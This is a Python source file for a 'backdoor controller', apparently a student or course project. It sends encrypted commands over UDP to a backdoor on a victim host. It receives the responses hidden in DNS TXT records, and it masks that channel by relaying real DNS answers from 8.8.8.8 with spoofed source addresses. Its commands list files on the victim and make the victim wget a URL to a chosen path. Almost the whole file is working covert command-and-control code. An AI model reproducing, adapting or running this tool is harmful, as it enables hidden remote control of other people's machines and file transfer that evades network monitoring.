"""
    This is the backdoor controller program.
    It allows you to control the backdoor on a victim host
    by sending it different commands over a network.
"""

# Ignore warnings
from warnings import filterwarnings
filterwarnings("ignore")

# Standard Library Modules
import argparse
from multiprocessing import Process, SimpleQueue
from ipaddress import ip_address, IPv6Address
from sys import exit
from time import sleep

# Custom Modules
from utils.shell import *
from utils.encryption import *
from utils.validation import validate_ipv4_address, validate_nic_interface

# Third Party Libraries
from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS


# Command Line Arguments
PARSER = argparse.ArgumentParser("./main.py")
PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host")
PARSER.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
ARGS = PARSER.parse_args()


# Validate Arguments
if not validate_ipv4_address(ARGS.controller_ip):
    print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
    exit(1)

if not validate_ipv4_address(ARGS.backdoor_ip):
    print(f"Invalid IPv4 Address: '{ARGS.backdoor_ip}'")
    exit(1)

if not validate_nic_interface(ARGS.interface):
    print(f"Network Interface does not exist: '{ARGS.interface}'")
    exit(1)


# Global Variables
CONTROLLER_IP = ARGS.controller_ip
BACKDOOR_IP = ARGS.backdoor_ip
NETWORK_INTERFACE = ARGS.interface
QUEUE = SimpleQueue()
ENCRYPTION_HANDLER = StreamEncryption()


# Initialize the encryption context.
ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
ENCRYPTION_HANDLER.read_secret("data/secret.key")
ENCRYPTION_HANDLER.initialize_encryption_context()


def subprocess_packet_handler(pkt):
    """
    
    """
    if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
        return None
    # 1. Get the data in the TXT record.
    encrypted_message = pkt[UDP].ar.rdata[0]
    # 2. Put the data in the queue.
    QUEUE.put(encrypted_message)
    # 3. Craft a legit query.
    forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
    # 4. sr1 the DNS query to a legit DNS server.
    response = sr1(forged, verbose=0)
    # 5. send the response back to the backdoor machine.
    response[IP].src = f"{CONTROLLER_IP}"
    response[IP].dst = f"{BACKDOOR_IP}"
    send(response, verbose=0)


def subprocess_start():
    """
    """
    sniff(filter=f"ip src host {BACKDOOR_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)


def send_udp(data: str):
    """
        Sends a UDP packet to the backdoor which is supposed to contain a command.
        All commands get sent to a specific UDP port on the backdoor machine.
        The UDP packet that is sent contains the encrypted command in the payload
        section. The backdoor machine listens for a specific port to know that
        the UDP packet is ours.
    """
    data = data.encode("utf-8")
    # Encrypt the data.
    data = ENCRYPTION_HANDLER.encrypt(data)
    # Forge the UDP packet.
    pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{BACKDOOR_IP}")/UDP(sport=10069, dport=10420, len=len(data))
    pkt[UDP].payload = Raw(data)
    # Send the packet.
    send(pkt, verbose=0)


def receive_response():
    encrypted = None
    while True:
        if QUEUE.empty():
            sleep(0.5)
            continue
        encrypted = QUEUE.get()
        break
    decrypted = ENCRYPTION_HANDLER.decrypt(encrypted)
    print(f"Response: {decrypted.decode('utf-8')}")


if __name__ == "__main__":

    # Start the secondary process which sniffs for DNS requests from the backdoor,
    # decodes the attached information, and forwards the DNS request to a legitimate server,
    # then forwards the legitmate response back to the backdoor.
    decode_process = Process(target=subprocess_start)
    decode_process.start()

    # Interactive Shell
    print_menu()
    while True:
        try:
            command = input("λ: ")
        except KeyboardInterrupt:
            break
        argv = command.split(" ")
        argc = len(argv)
        if argc == 1:
            if command == HELP:
                print_help()
                continue
            elif command == CLEAR:
                clear_screen()
                continue
            elif command == EXIT:
                break
        if argc == 2:
            if argv[0] == LIST:
                file_path = argv[1]
                data = argv[0] + " " + argv[1]
                send_udp(data)
                receive_response()
                continue
        if argc == 3:
            if argv[0] == WGET:
                url = argv[1]
                filepath = argv[2]
                data = argv[0] + " " + argv[1] + " " + argv[2]
                send_udp(data)
                receive_response()
                continue
        else:
            print(f"Command not found: {command}")
    decode_process.kill()
